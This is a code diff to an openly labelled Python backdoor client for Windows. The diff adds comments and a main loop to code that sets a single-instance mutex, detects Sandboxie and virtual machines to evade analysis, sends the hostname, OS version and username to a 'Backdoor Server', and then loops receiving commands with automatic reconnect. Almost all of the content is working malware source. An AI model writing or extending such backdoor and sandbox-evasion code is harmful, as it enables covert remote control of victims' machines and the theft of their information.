@@ -40,6 +40,7 @@ intBuffer = 1024
 # Step 3: Define and Create Mutex Object
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 
+# if Mutex is Already Created(mean app is running now), Exit the App
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     exit(0)
@@ -47,6 +48,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 #  Step 4: Define a Function to Detect Sandboxie
 def detect_sandboxie():
     try:
+        # Extract the sandboxie dll file to ckeck if it exists
         libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
         return " (Sandboxie) "
 
@@ -57,7 +59,10 @@ def detect_sandboxie():
 def detectVM():
     objWMI = WMI()
 
+    # Iterate on all disk drives
     for diskDrive in objWMI.query("Select * from Win32_DiskDrive"):
+
+        # Check if the drive is a virtual disk drive
         if 'vbox' in diskDrive.Caption.lower() or 'virtual' in diskDrive.Caption.lower():
             return " (Virtual Machine) "
 
@@ -79,6 +84,7 @@ def server_connect():
 
         else: break
 
+    # Initialize User Information to Send to Backdoor Server
     strUserInfo = (socket.gethostname() + "'," + platform.system() + " " + platform.release() +
                    detect_sandboxie() + detectVM() + "'," + environ["USERNAME"])
 
@@ -94,6 +100,27 @@ recv = lambda buffer: objSocket.recv(buffer)
 send = lambda data: objSocket.send(data)
 
 
+# Step 8: Connect to Server Implement Main Loop for Connect Client to Server
+server_connect()
+
+while True:
+    try:
+        while True:
+
+            # Receive Data(Command) from the Backdoor Server and Decode it
+            strData = recv(intBuffer)
+            strData = decode_utf8(strData)
+
+            # exit command received from Backdoor server
+            if strData == 'exit':
+                objSocket.close() # noqa
+                exit(0)
+
+    # Handle if Backdoor Server not Responding try to Reconnect to Server
+    except socket.error():
+        objSocket.close()
+        del objSocket
+        server_connect()
 
 
 
